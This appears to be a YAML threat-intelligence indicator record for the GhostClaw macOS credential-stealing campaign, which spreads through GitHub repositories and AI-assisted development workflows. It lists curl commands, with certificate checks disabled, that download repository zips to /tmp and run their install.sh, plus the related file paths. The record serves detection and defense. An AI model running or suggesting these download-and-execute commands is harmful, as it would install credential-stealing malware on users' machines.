description: GhostClaw malware campaign uses GitHub repositories and AI-assisted development
  workflows to deliver credential-stealing payloads on macOS.
attribution: 'null'
malware_families:
- Ghost Claw
- Antigravity Pack
TTPs:
  processes:
  - bash
  - node
  commandline:
  - curl -fsSLk https://github.com/antigravity-sdk/antigravity-pack/archive/refs/heads/main.zip
    -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/antigravity-pack-main
    && bash install.sh
  - curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip
    -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main
    && bash install.sh
  scripting_engine:
  - curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip
    -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main
    && bash install.sh
  file_activity:
  - /tmp/cw.zip
  - /tmp/antigravity-pack-main/install.sh
  - /tmp/TradingView-Claw-main/install.sh
  - ~/.openclaw/skills/TradingView-Claw
  persistence: null
  process_relations: null
